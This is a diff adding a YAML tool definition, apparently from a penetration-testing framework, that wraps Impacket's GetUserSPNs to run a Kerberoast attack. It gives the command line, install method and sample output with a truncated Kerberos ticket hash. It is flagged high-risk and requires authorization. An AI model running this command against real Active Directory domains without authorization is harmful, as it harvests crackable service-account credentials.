@@ -1,0 +1,37 @@
+id: impacket_getuserspns
+name: "Impacket: GetUserSPNs (kerberoast)"
+category: lateral-movement
+description: "Request TGS for accounts with SPNs \u2014 Kerberoast attack."
+binary: impacket-GetUserSPNs
+risk: high_active
+requires_authorization: true
+inputs:
+- name: target
+  type: ip_or_host
+  required: true
+outputs:
+- name: results
+  type: text
+command:
+  argv:
+  - "impacket-GetUserSPNs"
+  - "-request"
+  - "{{target}}"
+parser:
+  type: line_based
+  entity: raw
+default_timeout_seconds: 1800
+max_retries: 0
+retry_backoff_seconds: 2.0
+continue_on_error: false
+tags:
+- impacket
+- kerberoast
+- active-directory
+install:
+  method: pipx
+  package: "impacket"
+dry_run_output:
+- "ServicePrincipalName    Name           MemberOf"
+- "MSSQLSvc/srv01          svc_sql        CN=Domain Admins"
+- "$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/srv01*$abcdef..."
